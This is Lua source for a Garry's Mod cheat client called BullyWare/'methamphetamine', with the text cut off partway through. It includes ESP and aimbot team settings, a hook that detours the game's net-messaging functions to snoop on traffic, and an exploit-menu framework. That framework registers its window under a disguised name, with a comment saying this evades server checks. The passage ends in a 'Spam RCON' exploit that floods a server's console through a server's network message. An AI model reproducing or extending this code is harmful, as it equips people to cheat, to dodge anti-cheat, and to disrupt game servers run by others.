            draw.RoundedBox( 6,w*0.15,h*0.4, (methamphetamine.currentradiostation:GetTime()/methamphetamine.currentradiostation:GetLength()) * w*0.7,4, methamphetamine.colors.activebutton )
            draw.RoundedBox(8,w*0.15 + (methamphetamine.currentradiostation:GetTime()/methamphetamine.currentradiostation:GetLength()) * w*0.7 - 2, h*0.4 -2 , 8,8, methamphetamine.colors.activebutton)
            draw.SimpleText( string.FormattedTime(methamphetamine.currentradiostation:GetLength()-(methamphetamine.currentradiostation:GetLength()-methamphetamine.currentradiostation:GetTime()), "%02i:%02i" ), methamphetamine.default.font , w*0.15 , h*0.4+3 , methamphetamine.colors.text, 0,2 )
            draw.SimpleText(  (methamphetamine.currentradiostation:GetLength() < 0 and "Inf") or string.FormattedTime(methamphetamine.currentradiostation:GetLength(), "%02i:%02i" ), methamphetamine.default.font , w*0.85 , h*0.4+3 , methamphetamine.colors.text, TEXT_ALIGN_RIGHT,2 )
        end
    end
    -- mod.panel.current.slider = mod.panel.current:Add("DButton")
    -- --mod.panel.current.slider:SetPos(8,w*0.15 + (methamphetamine.currentradiostation:GetTime()/methamphetamine.currentradiostation:GetLength()) * w*0.7 - 2)
    -- mod.panel.current.slider:SetSize(8,8)
    -- mod.panel.current.slider.Paint = function(pnl,w,h)
    --     draw.RoundedBox(8,0,0,w,h,methamphetamine.colors.activebutton)
    -- end
    -- mod.panel.current.slider.ypos = mod.panel.current:GetTall()*0.4-3
    -- mod.panel.current.slider.Think = function(pnl)  
    --     if IsValid( methamphetamine.currentradiostation ) then
    --         pnl:SetPos(mod.panel.current:GetWide()*0.15 + (methamphetamine.currentradiostation:GetTime()/methamphetamine.currentradiostation:GetLength()) * mod.panel.current:GetWide()*0.7, pnl.ypos )     
    --     end
    -- end
    -- mod.panel.current.slider.DoClick = function(pnl)
    --     if IsValid( methamphetamine.currentradiostation ) then
    --         local x,y = input.GetCursorPos()
    --         local w,h = mod.panel.current:GetSize()
    --         local x1,y1 = mod.panel.current:LocalToScreen()
    --         local sx,sy = pnl:GetSize()
    --         local diff = ((x-x1)/(w))*methamphetamine.currentradiostation:GetLength()
    --         methamphetamine.currentradiostation:SetTime( diff )
    --     end
    -- end 

    mod.panel.current.toggle = mod.panel.current:Add("DButton")
    mod.panel.current.toggle:SetSize(26,26) 
    mod.panel.current.toggle:SetText("")
    mod.panel.current.toggle.Paint = function(pnl,w,h)
        surface.SetMaterial( not pnl.Paused and pausemat or playmat )
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.disabledtext or methamphetamine.colors.activebutton )
        surface.DrawTexturedRect(0,0,w-0,h-0)
    end
    mod.panel.current.toggle.Paused = false
    mod.panel.current.toggle.DoClick = function(pnl)
        if not IsValid( methamphetamine.currentradiostation ) then return end
        if not pnl.Paused then
            methamphetamine.currentradiostation:Pause()
            pnl.Paused = true
            return
        end
        methamphetamine.currentradiostation:Play()
        pnl.Paused = false
    end

    mod.panel.current.skip = mod.panel.current:Add("DButton")
    mod.panel.current.skip:SetSize(26,26) 
    mod.panel.current.skip:SetText("")
    mod.panel.current.skip.Paint = function(pnl,w,h)
        surface.SetMaterial( skipmat )
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.disabledtext or methamphetamine.colors.activebutton )
        surface.DrawTexturedRect(1,1,w-2,h-2)
    end
    mod.panel.current.skip.DoClick = function(pnl)
        if not IsValid( methamphetamine.currentradiostation ) then return end
        
    end

    mod.panel.current.skipback = mod.panel.current:Add("DButton")
    mod.panel.current.skipback:SetSize(26,26) 
    mod.panel.current.skipback:SetText("")
    mod.panel.current.skipback.Paint = function(pnl,w,h)
        surface.SetMaterial( skipbackmat )
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.disabledtext or methamphetamine.colors.activebutton )
        surface.DrawTexturedRect(1,1,w-2,h-2)
    end
    mod.panel.current.skipback.DoClick = function(pnl)
        if not IsValid( methamphetamine.currentradiostation ) then return end
        
    end


    mod.panel.current.PerformLayout = function(pnl,w,h)
        mod.panel.current.toggle:SetPos( w /2 - 13, h *0.62 )
        mod.panel.current.skip:SetPos( w /2 + 13 + 3, h *0.62 )
        mod.panel.current.skipback:SetPos( w/2 - 26 - 13 -3, h *0.62 )
    end

    mod.panel.channels = mod.panel:Add("methamphetamine.submods")
    mod.panel.channels:Dock(FILL)
    mod.panel.channels:AddCheat("Radio", "methamphetamine.radiopage")
    mod.panel.channels:AddCheat("Youtube", "DButton")
    mod.panel.channels:AddCheat("History", "DButton")
end)    

local PANEL = {}
function PANEL:Init()
    self.list = self:Add("DScrollPanel")
    local vbar = self.list:GetVBar()
    vbar:SetHideButtons( true )
    vbar.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.gripbackground)
    end
    vbar.btnGrip.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.grip)
    end
    vbar:SetWide(4)
    vbar:DockMargin(0,2,2,2)
    self.list:Dock(FILL)
    self:AddLine("Name","SteamID","Team","Friend",nil,true)
    for k , v in ipairs( player.GetAll()) do
        self:AddLine( v:Name(),v:SteamID(), team.GetName(v:Team()), methamphetamine.friends[v] and "Yes" or "No",v ) 
    end
end

function PANEL:AddLine( name,sid,team,friend,obj,underline )
    local line = self.list:Add("DPanel")
    line:Dock(TOP)
    line:SetTall(20)
    line.ply = obj
    line.friendtxt = friend
    line:DockMargin(0,0,0,0)
    line.Paint = function(pnl,w,h)
        if underline then
            surface.SetDrawColor( methamphetamine.colors.activebutton )
            surface.DrawRect(0,h-1,w,1)
        end
        surface.DrawRect((550/4)*1,0,1,h)
        surface.DrawRect((550/4)*2,0,1,h)
        surface.DrawRect((550/4)*3,0,1,h)
        surface.DrawRect((550/4)*4,0,1,h)
    end
    line.name = line:Add("DButton")
    line.name:Dock(LEFT)
    line.name:SetText("")
    line.name:SetWide( 550/4 )
    line.name.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( name, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end
    line.sid = line:Add("DButton")
    line.sid:Dock(LEFT)
    line.sid:SetText("")
    line.sid:SetWide( 550/4 )
    line.sid.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )

        draw.SimpleText( sid , methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )

    end
    line.team = line:Add("DButton")
    line.team:Dock(LEFT)
    line.team:SetText("")
    line.team:SetWide( 550/4 )
    line.team.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )

        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( team, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end

    line.friend = line:Add("DButton")
    line.friend:Dock(LEFT)
    line.friend:SetText("")
    line.friend:SetWide( 550/4 )
    line.friend.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( line.friendtxt, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end
    line.friend.DoClick = function(pnl)
        if line.ply then
            methamphetamine.friends[line.ply] = not (methamphetamine.friends[line.ply] or false)
            line.friendtxt = methamphetamine.friends[line.ply] and "Yes" or "No"
        end
    end
end
vgui.Register("methamphetamine.playerlist", PANEL)
local PANEL = {}

function PANEL:Init()
    self.list = self:Add("DScrollPanel")
    local vbar = self.list:GetVBar()
    vbar:SetHideButtons( true )
    vbar.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.gripbackground)
    end
    vbar.btnGrip.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.grip)
    end
    vbar:SetWide(4)
    vbar:DockMargin(0,2,2,2)
    self.list:Dock(FILL)
    self:AddLine("Name","Shown on ESP",true)
    for k , v in SortedPairs(scripted_ents.GetList()) do
        print(k,v)
        self:AddLine( v.t.ClassName, methamphetamine.mods["ESP"].Entities[v.ClassName] or false ) 
    end
end

function PANEL:AddLine( classname,shown,underline )
    local line = self.list:Add("DPanel")
    line:Dock(TOP)
    line:SetTall(20)
    line:DockMargin(0,0,0,0)
    line.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        if underline then
            surface.DrawRect(0,h-1,w,1)
            draw.SimpleText("Shown on ESP", methamphetamine.default.font , w/2 + 10 , h/2 , methamphetamine.colors.text ,0,1)
        end
        surface.DrawRect((550/2),0,1,h)

    end

    line.name = line:Add("DButton")
    line.name:Dock(LEFT)
    line.name:SetText("")
    line.name:SetWide( (550/2) )
    line.name.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( classname, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end
    if not underline then
        line.shownonesp = line:Add("methamphetamine.checkbox")
        line.shownonesp:NoClipping( false )
        line.shownonesp:SetPos( 550/2+3 + 1,1  )
        line.shownonesp:SetLabel("")
        line.shownonesp:SetSize( 20-2,20-2 ) 
        line.shownonesp:SetState( methamphetamine.mods["ESP"].Entities[classname] or false ) 
        line.shownonesp:Configure("ESP","Entities",classname)
        -- line.shownonesp.Paint = function(pnl,w,h)
        --     surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        --     surface.DrawRect(0,0,w,h)
        --     surface.SetDrawColor( methamphetamine.colors.            activebutton )
        --     -- surface.DrawRect(w-1,0,1,h)
        --     --draw.SimpleText( line.shownonesptxt, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
        -- end
        line.shownonesp.OnToggle = function(pnl,state)   
            methamphetamine.mods["ESP"].Entities[classname] = (state or false)
        end
    end
    
end

vgui.Register("methamphetamine.entitylist",PANEL)

local PANEL = {}

function PANEL:Init()
    self.list = self:Add("DScrollPanel")
    local vbar = self.list:GetVBar()
    vbar:SetHideButtons( true )
    vbar.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.gripbackground)
    end
    vbar.btnGrip.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.grip)
    end
    vbar:SetWide(4)
    vbar:DockMargin(0,2,2,2)
    self.list:Dock(FILL)
    self:AddLine(0,"Name","Ignore",true)
    for k , v in SortedPairs(team.GetAllTeams()) do
        print(k,v)
        self:AddLine(k,v.Name, false ) 
    end
end

function PANEL:AddLine( id,name,shown,underline )
    local line = self.list:Add("DPanel")
    line:Dock(TOP)
    line:SetTall(20)
    line:DockMargin(0,0,0,0)
    line.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        if underline then
            surface.DrawRect(0,h-1,w,1)
            draw.SimpleText("Ignore", methamphetamine.default.font , w/2 + 10 , h/2 , methamphetamine.colors.text ,0,1)
        end
        surface.DrawRect((550/2),0,1,h)

    end

    line.name = line:Add("DButton")
    line.name:Dock(LEFT)
    line.name:SetText("")
    line.name:SetWide( (550/2) )
    line.name.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( name, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end
    if not underline then
        line.addteam = line:Add("methamphetamine.checkbox")
        line.addteam:NoClipping( false )
        line.addteam:SetPos( 550/2+3 + 1,1  )
        line.addteam:SetLabel("")
        line.addteam:SetSize( 20-2,20-2 ) 
        line.addteam:SetState( methamphetamine.mods["Aim"].Teams[name] or false )
        line.addteam.OnToggle = function(pnl,state)   
            methamphetamine.mods["Aim"].Teams[id] = (state or false)
        end
    end
    
end


vgui.Register("methamphetamine.teamlist", PANEL )

mods:Add("Environment List", function( mod , toggle )
    if not toggle then 
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(550,480)
    mod.panel:Center()
    mod.panel:SetTitle("Environment List")
    mod.panel.contents = mod.panel:Add("methamphetamine.submods")
    mod.panel.contents:Dock(FILL)
    mod.panel.contents:AddCheat("Player List", "methamphetamine.playerlist")
    mod.panel.contents:AddCheat("Entity List", "methamphetamine.entitylist")
    mod.panel.contents:AddCheat("Team List", "methamphetamine.teamlist")
end)    


hook.Remove("ScalePlayerDamage","methamphetamine.log",function( ply, hitgroup, dmginfo )
    local attacker = dmginfo:GetAttacker()
    methamphetamine.Log( attacker:Nick().. " dealt " .. dmginfo:GetDamage() .. " damage to ".. ply:Nick().. " using a ".. attacker:GetActiveWeapon():GetClass()  )
end)


mods:Add("Debug Console", function (mod,toggle)
    if not toggle then 
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(550,300)
    mod.panel:SetPos(5,5)
    mod.panel:SetTitle("BullyWare - Console")
    mod.panel.scroll = mod.panel:Add("DScrollPanel")
    mod.panel.scroll:Dock(FILL)
    mod.panel.scroll:DockMargin(4,4,4,4)
    local vbar = mod.panel.scroll:GetVBar()
    function vbar:Paint(w, h)
        draw.RoundedBox(4, 0, 0, w, h, methamphetamine.colors.grip )
    end
    function vbar.btnGrip:Paint(w, h)
        draw.RoundedBox(4, 0, 0, w, h, methamphetamine.colors.gripbackground)
    end
    vbar:SetWide(4)
    vbar:SetHideButtons(true)


    for k , v in ipairs(methamphetamine.DebugLogs) do
        if k == 200 then return end
        if not IsValid(mod.panel) then return end
        local panel = mod.panel.scroll:Add("Panel")
        panel:Dock(TOP)
        panel:SetZPos(6)
        panel.markup = markup.Parse( "<colour=179,179,179,255><font=".. methamphetamine.default.font..">".. "[".. os.date("%X",v.time).."] ".. v.text .. "</font></colour>", mod.panel:GetWide() - 12  )
        panel:SetTall( panel.markup:GetHeight() + 8 )
        panel.Paint = function (pnl,w,h)
            surface.SetDrawColor( v.id % 2 == 0 and methamphetamine.colors.gripbackground or methamphetamine.colors.menubar )
            surface.DrawRect(0,0,w,h)
            pnl.markup:Draw(4,4)
        end
    end
    hook.Add("methamphetamine.log","AddToDebugger",function (tbl)
        if mod.panel.scroll or IsValid(mod.panel.scroll) then
            local panel = mod.panel.scroll:Add("Panel")
            panel:Dock(TOP)
            panel:SetZPos(6)
            -- panel.Label = panel:Add("DLabel")
            -- panel.Label:Dock(FILL)
            -- panel.Label:SetFont(methamphetamine.default.font)
            -- panel.Label:SetTextColor(methamphetamine.colors.text)
            -- panel.Label:SetWrap(true)
            -- panel.Label:SizeToContents()
            -- panel.Label:SetText("[".. os.date("%X",tbl.time).."] ".. tbl.text)
            panel.markup = markup.Parse( "<colour=179,179,179,255><font=".. methamphetamine.default.font..">".. "[".. os.date("%X",tbl.time).."] ".. tbl.text .. "</font></colour>", mod.panel:GetWide() - 12  )

            panel:SetTall( panel.markup:GetHeight() + 8 )
            panel.Paint = function (pnl,w,h)
                surface.SetDrawColor( tbl.id % 2 == 0 and methamphetamine.colors.gripbackground or methamphetamine.colors.menubar )
                surface.DrawRect(0,0,w,h)
                pnl.markup:Draw(4,4)
            end
        end
    end)
end)



mods:Add("Force close", function(mod,toggle)
    methamphetamine.master:SetVisible(false)
end)


local PANEL = {}

function PANEL:Init()  
    methamphetamine.master:SetVisible(false)
    self:SetSize(300,400)
    self:MakePopup()
    self.bar.closeButton = self.bar:Add("DButton")
    self.bar.closeButton:Dock(RIGHT)
    self.bar.closeButton:SetWide(20)
    self.bar.closeButton:SetText("")
    self.bar.closeButton.Paint = function(pnl,w,h)
        draw.SimpleText("X",methamphetamine.default.font,w/2,h/2,methamphetamine.colors.disabledtext,1,1)
    end
    self.bar.closeButton.DoClick = function()
        self:Remove()
    end 

    self.bar.minimise = self.bar:Add("DButton")
    self.bar.minimise:Dock(RIGHT)
    self.bar.minimise:SetWide(20)
    self.bar.minimise:SetText("")
    self.bar.minimise.Paint = function(pnl,w,h)
        surface.SetDrawColor(methamphetamine.colors.disabledtext)
        surface.DrawLine(w*0.3,h*0.8,w*0.7,h*0.8)
    end
    self.bar.minimise.DoClick = function()
        self:SetVisible(false)
    end 

    self.exploits = self:Add("Panel")
    self.exploits:Dock(LEFT)
    self.exploits.List = self.exploits:Add("DScrollPanel")
    self.exploits.List:Dock(TOP)
    self.exploits.pages = {}
    self._exploits = {}
    self:Initialize()
    self:SetActivePage(1)
    self.exploits.List:SetTall(#self.exploits.pages*20)
end

function PANEL:SetActivePage(iPage)
    self.exploits.active = self.exploits.pages[iPage]
    self.exploits.active.page:SetVisible(true)
end

function PANEL:AddExploit(name, data)
    self._exploits[name] = data
    self.exploits.pages[#self.exploits.pages+1] = self.exploits.List:Add("DButton")
    local exploit = self.exploits.pages[#self.exploits.pages]
    exploit:Dock(TOP)
    exploit:SetTall(20)
    exploit:SetText(name)
    exploit:SetFont( methamphetamine.default.font )
    exploit:SetTextColor( methamphetamine.colors.text )
    exploit.canExecute = data.requirements()
    exploit.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.border or methamphetamine.colors.hovered)
        surface.DrawRect(0,0,w,h)
    end
    if not exploit.canExecute then
        exploit:MethToolTip("This exploit can not be used on this server.")
    end

    exploit.DoClick = function(pnl)
        if IsValid(self.exploits.active) then
            self.exploits.active.page:SetVisible(false)
        end
        pnl.page:SetVisible(true)
        self.exploits.active = pnl
    end
    
    exploit.page = self:Add("methamphetamine.panel")
    exploit.page:Dock(FILL)
    exploit.page.Header = exploit.page:Add("Panel")
    exploit.page.Header:Dock(TOP)
    exploit.page.Header:SetTall(30)
    exploit.page.Header.Paint = function(pnl,w,h)
        draw.SimpleText(data.name, methamphetamine.default.font,w/2,h/2,methamphetamine.colors.text,1,1)
        surface.SetDrawColor(methamphetamine.colors.text)
        surface.DrawRect(w*0.2,h*0.8,w*0.6,1)
    end
    exploit.page.args = {}
    exploit.attackArgs = {}

    if data.desc then
        exploit.page.desc = exploit.page:Add("Panel")
        local desc = exploit.page.desc
        desc:Dock(TOP)
        desc:SetTall(30)
        desc:DockMargin(4,0,4,0)
        local label = desc:Add("DLabel")
        label:Dock(FILL)
        label:SetWrap(true)
        label:SetFont(methamphetamine.default.font)
        label:SetTextColor(methamphetamine.colors.text)
        label:SetText(data.desc)
        label:SizeToContents()
    end

    for k,v in ipairs(data.args) do
        exploit.attackArgs[k] = v.default
        if v.type == "text" then
            local base = exploit.page:Add("EditablePanel")
            base:Dock(TOP)
            base:DockMargin(8,4,8,4)
            base:SetTall(35)
            base.Paint = function(pnl,w,h)
                draw.SimpleText(v.name, methamphetamine.default.font,5,5,methamphetamine.colors.text,0,1)
            end
            exploit.page.args[k] = base:Add("methamphetamine.search")
            local argBox = exploit.page.args[k]
            argBox:Dock(BOTTOM)
            argBox:SetTall(20)
            argBox.OnEnter = function(pnl,text)
                exploit.attackArgs[k] = text
            end
            argBox:SetValue(v.default)
        elseif v.type == "number"then
            local base = exploit.page:Add("EditablePanel")
            base:Dock(TOP)
            base:DockMargin(8,4,8,4)
            base:SetTall(35)
            base.Paint = function(pnl,w,h)
                draw.SimpleText(v.name, methamphetamine.default.font,5,5,methamphetamine.colors.text,0,1)
            end
            exploit.page.args[k] = base:Add("methamphetamine.slider")
            local argBox = exploit.page.args[k]
            argBox:SetMin(v.min)
            argBox:SetMax(v.max)
            argBox:SetValue(v.default)
            argBox:Dock(BOTTOM)
            argBox:SetTall(20)
            argBox:SetValue( v.default/v.max )
            argBox.OnValueChanged = function(pnl,val)
                exploit.attackArgs[k] = val*pnl:GetMax()
            end
        elseif v.type == "bool" then
            local base = exploit.page:Add("EditablePanel")
            base:Dock(TOP)
            base:DockMargin(8,4,8,4)
            base:SetTall(20)
            base.Paint = nil
            exploit.page.args[k] = base:Add("methamphetamine.checkbox")
            local argBox = exploit.page.args[k]
            argBox:SetState(v.default)
            argBox:Dock(LEFT)
            argBox:SetWide(20)
            argBox.OnToggle = function(pnl,val)
                exploit.attackArgs[k] = val
            end
            argBox:SetLabel(v.name)
        end
    end

    local attack = exploit.page:Add("DButton")
    attack:SetText("Execute")
    attack:SetFont( methamphetamine.default.font )
    attack:SetTextColor( methamphetamine.colors.text )
    attack.Paint = function(pnl,w,h)
        surface.SetDrawColor(pnl:IsHovered() and methamphetamine.colors.border or methamphetamine.colors.hovered)
        surface.DrawRect(0,0,w,h)
    end
    if not exploit.canExecute then
        attack:MethToolTip("This exploit can not be used on this server.")
    end
    attack.DoClick = function(pnl)
        if not exploit.canExecute then return end
        self._exploits[name].active = not self._exploits[name].active
        if self._exploits[name].active and self._exploits[name].toggle then
            attack:SetText("Abort")
        else
            attack:SetText("Execute")
        end
        local executeData = {name = name,args={},canExecute=exploit.canExecute,active = self._exploits[name].active}
        for k,v in ipairs(data.args) do
            executeData.args[k] = exploit.attackArgs[k]
        end
        self._exploits[name].onExecute(executeData)
    end
 
    exploit.page.PerformLayout = function(pnl,w,h)
        attack:SetPos( w/2-60, (#exploit.page.args * 35) + 80 )
        attack:SetSize(120,20)
    end
    exploit.page:SetVisible(false)
end

methamphetamine.exploits = methamphetamine.exploits
function PANEL:Initialize()
    self.exploits.List:Clear()
    for k,v in ipairs( methamphetamine.exploits ) do
        self:AddExploit(v.name, v)
    end
end

function PANEL:PerformLayout(w,h)
    self.exploits:SetWide(w*0.4)
end

vgui.Register("methamphetamine.windows.exp_lo1ts",PANEL,"methamphetamine.frame") -- just in case a server decides to look for 'exploits' within vgui.Register/Create


mods:Add("Exploit menu", function(mod,toggle)
    if not toggle then 
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.windows.exp_lo1ts")
    mod.panel:SetSize(550,480)
    mod.panel:Center()
    mod.panel:SetTitle("Exploit menu")
end)

local PANEL = {}

function PANEL:Init()
    self.list = self:Add("DScrollPanel")
    local vbar = self.list:GetVBar()
    vbar:SetHideButtons( true )
    vbar.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.gripbackground)
    end
    vbar.btnGrip.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.grip)
    end
    vbar:SetWide(4)
    vbar:DockMargin(0,2,2,2)
    self.list:Dock(FILL)
    self:AddLine("Name",true)
    for name, bool in SortedPairs(methamphetamine.cachedNetMessages) do
        self:AddLine( name ) 
    end

end


function PANEL:AddLine( name,underline )
    local line = self.list:Add("DPanel")
    line:Dock(TOP)
    line:SetTall(20)
    line:DockMargin(0,0,0,0)
    line.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        if underline then
            surface.DrawRect(0,h-1,w,1)
            draw.SimpleText("Name", methamphetamine.default.font , 8 , h/2 , methamphetamine.colors.text ,0,1)
        end

    end

    line.name = line:Add("DButton")
    line.name:Dock(LEFT)
    line.name:SetText("")
    line.name:SetWide( 550 )
    line.name.Paint = function(pnl,w,h)
        surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.activebutton or color_transparent )
        surface.DrawRect(0,0,w,h)
        surface.SetDrawColor( methamphetamine.colors.activebutton )
        -- surface.DrawRect(w-1,0,1,h)
        draw.SimpleText( name, methamphetamine.default.font, 8,h/2, methamphetamine.colors.text,0,1 )
    end

end

vgui.Register("methamphetamine.windows.netmessages",PANEL,"methamphetamine.frame")


local PANEL = {}

function PANEL:Init()

end

vgui.Register("methamphetamine.windows.netmessagelistener",PANEL,"methamphetamine.frame")


mods:Add("Net Message List", function(mod,toggle)
    if not toggle then 
        mod.panel:SetVisible(false)
        return
    end
    if IsValid(mod.panel) then
        mod.panel:SetVisible(true)
        return
    end
    mod.panel = vgui.Create("methamphetamine.windows.netmessages")
    mod.panel:SetSize(550,480)
    mod.panel:Center()
    mod.panel:SetTitle("Net Message List")
end)


__detouredNetMessages = __detouredNetMessages or false
local netReceive = net.Receive
local netWriteString = net.WriteString
local netWriteInt = net.WriteInt
local netWriteEntity = net.WriteEntity
local netWriteUInt = net.WriteUInt
local netStart = net.Start
local netSendToServer = net.SendToServer

local HIDE_MESSAGES = {}

concommand.Add("__hide_net_msg",function(ply,cmd,args)
    HIDE_MESSAGES[args[1]] = true
end)

if not __detouredNetMessages then
    net.Receive = function(msg,callback)
        hook.Run("methamphetamine.NetListener","Receive",msg)
        return netReceive(msg,callback)
    end
    net.Start = function(msg,unreliable)
        if not HIDE_MESSAGES[msg] then
            hook.Run("methamphetamine.NetListener","Start",msg)
        end
        return netStart(msg,unreliable)
    end
    net.WriteString = function(msg)
        hook.Run("methamphetamine.NetListener","WriteString",msg)
        return netWriteString(msg)
    end
    net.WriteEntity = function(msg)
        hook.Run("methamphetamine.NetListener","WriteEntity",tostring(msg))
        return netWriteEntity(msg,callback)
    end
    net.WriteInt = function(msg,bit)
        hook.Run("methamphetamine.NetListener","WriteInt",msg .. ":" .. bit)
        return netWriteInt(msg,bit)
    end
    net.WriteUInt = function(msg,bit)
        hook.Run("methamphetamine.NetListener","WriteUInt",msg .. ":" .. bit)
        return netWriteUInt(msg,bit)
    end
    net.SendToServer = function()
        hook.Run("methamphetamine.NetListener","SendToServer","")
        return netSendToServer()
    end
end

mods:Add("Net Message Listener", function(mod,toggle)
    if not toggle then 
        mod.panel:SetVisible(false)
        return
    end
    if IsValid(mod.panel) then
        mod.panel:SetVisible(true)
        return
    end
    mod.panel = vgui.Create("methamphetamine.windows.netmessagelistener")
    mod.panel:SetSize(550,300)
    mod.panel:Center()
    mod.panel:SetTitle("Net Message List")
    mod.panel.scroll = mod.panel:Add("DScrollPanel")
    mod.panel.scroll:Dock(FILL)
    mod.panel.scroll:DockMargin(4,4,4,4)
    local vbar = mod.panel.scroll:GetVBar()
    function vbar:Paint(w, h)
        draw.RoundedBox(4, 0, 0, w, h, methamphetamine.colors.grip )
    end
    function vbar.btnGrip:Paint(w, h)
        draw.RoundedBox(4, 0, 0, w, h, methamphetamine.colors.gripbackground)
    end
    vbar:SetWide(4)
    vbar:SetHideButtons(true)

    local id = 0
    hook.Add("methamphetamine.NetListener","DermaShit",function(type,data)
        if not IsValid(mod.panel) then hook.Remove("methamphetamine.NetListener","DermaShit") return end
        local panel = mod.panel.scroll:Add("Panel")
        panel:Dock(TOP)
        panel:SetZPos(6)
        local time = os.time()
        panel.markup = markup.Parse( "<colour=179,179,179,255><font=".. methamphetamine.default.font..">".. "["..os.date("%X",time).."]".."["..type.."] ".. data .. "</font></colour>", mod.panel:GetWide() - 12  )
        panel:SetTall( panel.markup:GetHeight() + 8 )
        panel.Paint = function (pnl,w,h)
            surface.SetDrawColor( id % 2 == 0 and methamphetamine.colors.gripbackground or methamphetamine.colors.menubar )
            surface.DrawRect(0,0,w,h)
            pnl.markup:Draw(4,4)
        end
        id = id + 1
    end)
end)




-- for k , v in ipairs(methamphetamine.DebugLogs) do
--     if k == 200 then return end
--     if not IsValid(mod.panel) then return end
--     local panel = mod.panel.scroll:Add("Panel")
--     panel:Dock(TOP)
--     panel:SetZPos(6)
--     panel.markup = markup.Parse( "<colour=179,179,179,255><font=".. methamphetamine.default.font..">".. "[".. os.date("%X",v.time).."] ".. v.text .. "</font></colour>", mod.panel:GetWide() - 12  )
--     panel:SetTall( panel.markup:GetHeight() + 8 )
--     panel.Paint = function (pnl,w,h)
--         surface.SetDrawColor( v.id % 2 == 0 and methamphetamine.colors.gripbackground or methamphetamine.colors.menubar )
--         surface.DrawRect(0,0,w,h)
--         pnl.markup:Draw(4,4)
--     end
-- end

methamphetamine.windows = mods

--[[
    ____        ______     _       __              
   / __ )__  __/ / / /_  _| |     / /___ _________ 
  / __  / / / / / / / / / / | /| / / __ `/ ___/ _ \
 / /_/ / /_/ / / / / /_/ /| |/ |/ / /_/ / /  /  __/
/_____/\__,_/_/_/_/\__, / |__/|__/\__,_/_/   \___/ 
                  /____/                           
]]--


local exploits = {}

local count = 0
function exploits:Add( tData )
    count = count + 1
    tData.active = false
    tData.toggle = tData.toggle == nil and true or tData.toggle
    exploits[count] = tData
end

local i = 1
local netmsg = util.NetworkIDToString( i )
local tbl = {}
tbl[ netmsg ] = true
while netmsg ~= nil do
    i = i + 1
    netmsg = util.NetworkIDToString(i)
    tbl[ tostring(netmsg) ] = true
end
methamphetamine.cachedNetMessages = tbl

methamphetamine.ValidateNetMessage = function( strMsg ) 
    return methamphetamine.cachedNetMessages[strMsg] or false
end

exploits:Add({
    name = "Spam RCON",
    desc = "This spams the server's console.",
    args = {
        {type = "number", name = "Delay", default = 0.1, min = 0.1, max = 5},
    },
    requirements = function()
        return methamphetamine.ValidateNetMessage("steamid2")
    end,
    onExecute = function(tExploitData)
        if !tExploitData.canExecute then return end
        if tExploitData.active then
            timer.Remove("METHAMPHETAMINE.EXPLOIT."..tExploitData.name)
            return
        end
        print("Creating timer: ", "METHAMPHETAMINE.EXPLOIT."..tExploitData.name, tExploitData.args1, 0 )
